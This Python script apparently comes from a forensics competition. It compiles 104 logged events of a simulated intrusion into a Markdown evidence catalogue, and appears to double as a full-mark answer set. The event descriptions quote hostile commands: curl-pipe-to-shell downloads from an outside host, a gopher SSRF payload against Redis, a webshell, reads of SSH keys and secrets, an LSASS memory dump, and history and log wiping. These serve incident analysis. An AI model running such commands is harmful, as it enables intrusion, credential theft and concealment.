#!/usr/bin/env python3
"""Organize all evidence from the full-mark submission-new/evidence.csv into a readable catalog."""
import csv
from pathlib import Path

# event_id -> (time, source, description) gathered during log analysis
META = {
    "fw-20260706-144141": ("09:05:00", "edge/firewall", "攻击者 198.51.100.77 扫描 /login (recon path)"),
    "waf-20260706-096141": ("09:05:01", "edge/waf", "WAF 外部探测 /login"),
    "fw-20260706-144142": ("09:05:12", "edge/firewall", "扫描 /api"),
    "waf-20260706-096142": ("09:05:13", "edge/waf", "探测 /api"),
    "fw-20260706-144143": ("09:05:24", "edge/firewall", "扫描 /upload"),
    "waf-20260706-096143": ("09:05:25", "edge/waf", "探测 /upload"),
    "fw-20260706-144144": ("09:05:36", "edge/firewall", "扫描 /oa/preview"),
    "waf-20260706-096144": ("09:05:37", "edge/waf", "探测 /oa/preview"),
    "fw-20260706-144145": ("09:05:48", "edge/firewall", "扫描 /admin"),
    "waf-20260706-096145": ("09:05:49", "edge/waf", "探测 /admin"),
    "waf-20260706-096146": ("09:14:22", "edge/waf", "SSRF 告警 WAF-SSRF-8842, /oa/preview?url=gopher://127.0.0.1:6379/_eval"),
    "artifact-pcap-20260706-072042": ("09:14:22", "artifacts/pcap", "包72042: 198.51.100.77→10.20.10.21 POST /oa/preview (Host: oa.example), gopher SSRF"),
    "nginx-20260706-000001": ("09:14:23", "linux/nginx", "nginx 记录 SSRF 请求 status=200"),
    "oa-20260706-017559": ("09:14:24", "app/oa_app", "OA preview 后端请求完成 (gopher://127.0.0.1:6379/_eval)"),
    "audit-web-20260706-024801": ("09:16:10", "linux/web-prod-01 auditd", "www-data: bash -c curl -fsSL https://203.0.113.60/a.sh | sh"),
    "artifact-pcap-20260706-072073": ("09:16:14", "artifacts/pcap", "包72073: 10.20.10.21→203.0.113.60 GET /a.sh (Host: update-cache.example)"),
    "proxy-20260706-112001": ("09:16:14", "network/proxy", "代理记录 a.sh 下载 (script download from unusual domain)"),
    "fw-20260706-144146": ("09:16:26", "edge/firewall", "反向 HTTPS 会话 web-prod-01→198.51.100.77 (atk-callback-01)"),
    "edr-20260706-010135": ("09:16:30", "security/edr", "EDR: nginx worker 执行 bash 并外连"),
    "audit-web-20260706-024802": ("09:20:05", "linux/web-prod-01 auditd", "www-data 写入 /var/www/oa/public/.cache.php (webshell)"),
    "nginx-20260706-000002": ("09:20:14", "linux/nginx", "攻击者 POST /public/.cache.php status=200 (webshell 利用)"),
    "edr-20260706-010136": ("09:20:17", "security/edr", "EDR: public 目录下生成 php 文件"),
    "audit-web-20260706-024803": ("09:24:00", "linux/web-prod-01 auditd", "www-data: id"),
    "audit-web-20260706-024804": ("09:24:11", "linux/web-prod-01 auditd", "www-data: hostname -f"),
    "audit-web-20260706-024805": ("09:24:22", "linux/web-prod-01 auditd", "www-data: ip route"),
    "audit-web-20260706-024806": ("09:24:33", "linux/web-prod-01 auditd", "www-data: cat /etc/hosts"),
    "audit-web-20260706-024807": ("09:24:44", "linux/web-prod-01 auditd", "www-data: env"),
    "audit-web-20260706-024808": ("09:31:00", "linux/web-prod-01 auditd", "读取 /opt/oa/.env (数据库连接串)"),
    "audit-web-20260706-024809": ("09:31:24", "linux/web-prod-01 auditd", "读取 /home/deploy/.ssh/id_rsa (deploy SSH 私钥)"),
    "audit-web-20260706-024810": ("09:31:48", "linux/web-prod-01 auditd", "读取 /opt/oa/config/prod.yml (GitLab token)"),
    "artifact-pcap-20260706-072344": ("09:39:15", "artifacts/pcap", "包72344: 10.20.10.21→10.20.30.11 SSH (横向移动)"),
    "fw-20260706-144147": ("09:39:15", "edge/firewall", "web-prod-01→ops-jump-01:22 (web server ssh to ops jump)"),
    "auth-ops-20260706-016892": ("09:39:18", "linux/ops-jump-01 auth", "sshd: Accepted publickey for deploy from 10.20.10.21 (窃取私钥登录)"),
    "netflow-20260706-152001": ("09:39:19", "network/netflow", "长 SSH 会话 web→jump"),
    "audit-ops-20260706-024801": ("09:45:00", "linux/ops-jump-01 auditd", "deploy: cat /etc/ansible/hosts (主机清单)"),
    "audit-ops-20260706-024802": ("09:45:16", "linux/ops-jump-01 auditd", "deploy: cat /home/deploy/.bash_history"),
    "audit-ops-20260706-024803": ("09:45:32", "linux/ops-jump-01 auditd", "deploy: cat /srv/runbooks/db.yml (BI 库凭据)"),
    "mysql-20260706-036001": ("09:51:00", "data/mysql_core", "crm_ro 从 web-prod-01 登录 (outside app pool)"),
    "fw-20260706-144148": ("09:51:01", "edge/firewall", "web-prod-01→mysql-core-01:3306 (web direct mysql login)"),
    "mysql-20260706-036002": ("09:55:00", "data/mysql_core", "show tables (88 张)"),
    "mysql-20260706-036003": ("09:55:15", "data/mysql_core", "select customer"),
    "mysql-20260706-036004": ("09:55:30", "data/mysql_core", "select orders"),
    "mysql-20260706-036005": ("09:55:45", "data/mysql_core", "select information_schema.columns"),
    "audit-ops-20260706-024804": ("10:02:00", "linux/ops-jump-01 auditd", "deploy: cat /srv/ansible/group_vars/windows.yml (Windows 凭据)"),
    "audit-ops-20260706-024805": ("10:02:17", "linux/ops-jump-01 auditd", "deploy: klist (Kerberos 票据)"),
    "audit-ops-20260706-024806": ("10:02:34", "linux/ops-jump-01 auditd", "deploy: grep -R svc_backup /srv/ansible"),
    "mysql-20260706-036006": ("10:03:00", "data/mysql_core", "select key,value from sys_config where key like '%bi%'"),
    "edr-20260706-010138": ("10:03:05", "security/edr", "EDR: 应用账号查询含密码键的配置表"),
    "audit-ops-20260706-024807": ("10:05:00", "linux/ops-jump-01 auditd", "deploy: cat ~/.git-credentials (GitLab PAT)"),
    "gitlab-20260706-017582": ("10:05:18", "app/gitlab", "svc_deploy PAT 从跳板机登录 (PAT login from jump host)"),
    "netflow-20260706-152002": ("10:08:00", "network/netflow", "跳板机→ad-dc-01:389 LDAP 枚举"),
    "artifact-winsec-20260706-000001": ("10:08:06", "artifacts/windows xml", "XML: AD 4624 svc_backup 网络登录 (来源 10.20.30.11)"),
    "winsec-ad-20260706-000001": ("10:08:06", "windows/ad-dc-01 security", "4624 network logon from unusual source"),
    "artifact-winsec-20260706-000002": ("10:08:11", "artifacts/windows xml", "XML: AD 4769 Kerberos 服务票据 ldap/ad-dc-01"),
    "winsec-ad-20260706-000002": ("10:08:11", "windows/ad-dc-01 security", "4769 kerberos service ticket requested from jump"),
    "gitlab-20260706-017583": ("10:10:00", "app/gitlab", "list_projects (group/prod)"),
    "gitlab-20260706-017584": ("10:10:12", "app/gitlab", "list_runners (group/prod)"),
    "gitlab-20260706-017585": ("10:10:24", "app/gitlab", "read_ci_variables (group/prod)"),
    "pgsql-20260706-028001": ("10:12:00", "data/pgsql_bi", "bi_sync 从跳板机登录 (bi_sync login from jump host)"),
    "netflow-20260706-152004": ("10:12:01", "network/netflow", "跳板机→pgsql-bi-01:5432 (jump to bi database)"),
    "sysmon-ad-20260706-000001": ("10:13:00", "windows/ad-dc-01 sysmon", "svc_backup: net group 'Domain Admins' /domain"),
    "sysmon-ad-20260706-000002": ("10:13:20", "windows/ad-dc-01 sysmon", "svc_backup: nltest /dclist:corp.local"),
    "sysmon-ad-20260706-000003": ("10:13:40", "windows/ad-dc-01 sysmon", "svc_backup: net view /domain"),
    "gitlab-20260706-017586": ("10:18:00", "app/gitlab", "pipeline_create 设置变量 DEBUG_SCRIPT (project/oa-prod pipeline/99031)"),
    "pgsql-20260706-028002": ("10:18:00", "data/pgsql_bi", "COPY dw_customer_full TO STDOUT (21.5万行)"),
    "jenkins-20260706-018063": ("10:18:21", "app/jenkins", "gitlab webhook 触发 jenkins 作业 (unusual variable)"),
    "pgsql-20260706-028003": ("10:18:40", "data/pgsql_bi", "COPY dw_order_detail TO STDOUT (44.4万行)"),
    "pgsql-20260706-028004": ("10:19:20", "data/pgsql_bi", "COPY dw_invoice_2026 TO STDOUT (36.9万行)"),
    "artifact-winsec-20260706-000003": ("10:22:00", "artifacts/windows xml", "XML: win-admin-01 4624 svc_backup 远程交互登录 (LogonType 10)"),
    "winsec-win-20260706-024842": ("10:22:00", "windows/win-admin-01 security", "4624 remote interactive logon by service account"),
    "winsec-win-20260706-024843": ("10:22:03", "windows/win-admin-01 security", "4672 特殊权限 SeDebugPrivilege,SeBackupPrivilege"),
    "audit-ci-20260706-000001": ("10:24:00", "linux/ci-runner-01 auditd", "gitlab-runner: bash -c curl -fsSL https://203.0.113.60/ci.sh | bash"),
    "edr-20260706-010139": ("10:24:05", "security/edr", "EDR: CI runner 执行远程脚本 (unexpected remote shell script in pipeline)"),
    "artifact-sysmon-20260706-000001": ("10:27:00", "artifacts/windows xml", "XML: win-admin-01 procdump.exe -ma lsass.exe C:\\Windows\\Temp\\ls.dmp"),
    "sysmon-win-20260706-024801": ("10:27:00", "windows/win-admin-01 sysmon", "procdump lsass (lsass memory access)"),
    "edr-20260706-010137": ("10:27:02", "security/edr", "EDR: LSASS 内存转储行为 (credential dumping behavior)"),
    "audit-ci-20260706-000002": ("10:28:00", "linux/ci-runner-01 auditd", "gitlab-runner: cat token (K8s SA token)"),
    "k8s-20260706-018130": ("10:28:12", "cloud/k8s_audit", "ci-runner SA token 被使用 (token_review)"),
    "k8s-20260706-018131": ("10:34:00", "cloud/k8s_audit", "kubectl get secrets (namespace prod)"),
    "k8s-20260706-018132": ("10:34:12", "cloud/k8s_audit", "kubectl get pods"),
    "k8s-20260706-018133": ("10:34:24", "cloud/k8s_audit", "kubectl get configmaps"),
    "winsec-fil-20260706-024848": ("10:41:00", "windows/file-srv-01 security", "5145 读取财务共享 \\\\file-srv-01\\finance Finance2025/Q2/contracts"),
    "artifact-sysmon-20260706-000002": ("10:41:04", "artifacts/windows xml", "XML: file-srv-01 robocopy 写入 C:\\Temp\\f (bulk copy)"),
    "sysmon-fil-20260706-024801": ("10:41:04", "windows/file-srv-01 sysmon", "robocopy \\\\file-srv-01\\finance C:\\Temp\\f /E (bulk copy finance files)"),
    "iam-20260706-018161": ("10:42:00", "cloud/cloud_iam", "assume_role role/oss-backup-reader (使用 ci-runner SA)"),
    "obj-20260706-017768": ("10:42:09", "cloud/object_storage", "list bucket/prod-backup (list production backup bucket)"),
    "sysmon-win-20260706-024802": ("10:49:00", "windows/win-admin-01 sysmon", "7z.exe a C:\\Temp\\finance_q2.7z C:\\Temp\\f (archive finance files)"),
    "netflow-20260706-152003": ("10:49:30", "network/netflow", "win-admin-01→ops-jump-01:445 大 SMB 传输 182MB (large smb transfer to jump)"),
    "proxy-20260706-112002": ("11:08:00", "network/proxy", "POST https://archive-sync-bkt.storage.example/upload/bi_part01.zst (268MB)"),
    "fw-20260706-144149": ("11:08:01", "edge/firewall", "ops-jump-01→203.0.113.210:443 大出站上传 270MB"),
    "obj-20260706-017769": ("11:15:00", "cloud/object_storage", "get_object bucket/prod-backup/erp_full_20260705.tar.zst (734MB)"),
    "proxy-20260706-112003": ("11:15:30", "network/proxy", "PUT https://archive-sync-bkt.storage.example/upload/erp_full_20260705.tar.zst (734MB)"),
    "audit-ops-20260706-024808": ("11:35:00", "linux/ops-jump-01 auditd", "deploy: mkdir -p /tmp/.cache/.stage"),
    "audit-ops-20260706-024809": ("11:35:25", "linux/ops-jump-01 auditd", "deploy: tar -cf /tmp/.cache/.stage/full.tar finance_q2.7z bi_part01.zst"),
    "audit-ops-20260706-024810": ("11:35:50", "linux/ops-jump-01 auditd", "deploy: sha256sum full.tar"),
    "audit-ops-20260706-024811": ("11:42:00", "linux/ops-jump-01 auditd", "deploy: rm -f /tmp/ci.sh /tmp/a.sh"),
    "audit-ops-20260706-024812": ("11:42:11", "linux/ops-jump-01 auditd", "deploy: history -c"),
    "audit-ops-20260706-024813": ("11:42:22", "linux/ops-jump-01 auditd", "deploy: find /tmp/.cache -name '*.log' -delete"),
    "artifact-pcap-20260706-073871": ("11:50:00", "artifacts/pcap", "包73871: 10.20.30.11 DNS 查询 cdn-sync.example"),
    "dns-20260706-144001": ("11:50:00", "network/dns", "10.20.30.11 查询 cdn-sync.example → 203.0.113.77"),
    "artifact-pcap-20260706-073875": ("11:50:12", "artifacts/pcap", "包73875: 10.20.30.11→203.0.113.77:443 上传"),
    "proxy-20260706-112004": ("11:50:12", "network/proxy", "POST https://cdn-sync.example/sync/full.tar (1GB, final large exfiltration)"),
    "fw-20260706-144150": ("11:50:14", "edge/firewall", "ops-jump-01→203.0.113.77:443 最终外带 1.07GB"),
    "ids-20260706-010047": ("11:50:18", "security/ids", "IDS: 罕见域名大上传告警 (rare domain and large upload)"),
}

STAGE_CN = {
    "recon": "侦查 recon", "initial_access": "初始访问 initial_access",
    "execution": "执行 execution", "persistence": "持久化 persistence",
    "discovery": "发现 discovery", "credential_access": "凭据访问 credential_access",
    "credential_use": "凭据使用 credential_use", "lateral_movement": "横向移动 lateral_movement",
    "privilege_escalation": "权限提升 privilege_escalation", "collection": "收集 collection",
    "exfiltration": "外带 exfiltration", "defense_evasion": "防御规避 defense_evasion",
}

src = Path.home() / "Downloads/submission-new/evidence.csv"
rows = list(csv.DictReader(src.open()))
assert len(rows) == 104, len(rows)

lines = []
lines.append("# 攻击证据完整清单（104 条，evidence discovery 满分版）\n")
lines.append("来源：`~/Downloads/submission-new/evidence.csv`，全部事件发生在 **2026-07-06**。\n")
lines.append("| # | 时间 | 来源 | 证据 event_id | 阶段 | 内容 |")
lines.append("|---|---|---|---|---|---|")
for r in rows:
    eid = r["evidence_id"]
    evid = r["event_id"]
    stage = r["stage"]
    meta = META.get(evid, ("", "", ""))
    lines.append(f"| {eid} | {meta[0]} | {meta[1]} | `{evid}` | {STAGE_CN.get(stage, stage)} | {meta[2]} |")

out = Path("/Users/mashiro/Downloads/CISCN2026Final/team54-pro/build/work/evidence_catalog.md")
out.write_text("\n".join(lines) + "\n", encoding="utf-8")
print(f"wrote {out} ({len(rows)} rows)")
# sanity: any event without meta
missing = [r["event_id"] for r in rows if r["event_id"] not in META]
print("missing meta:", missing)
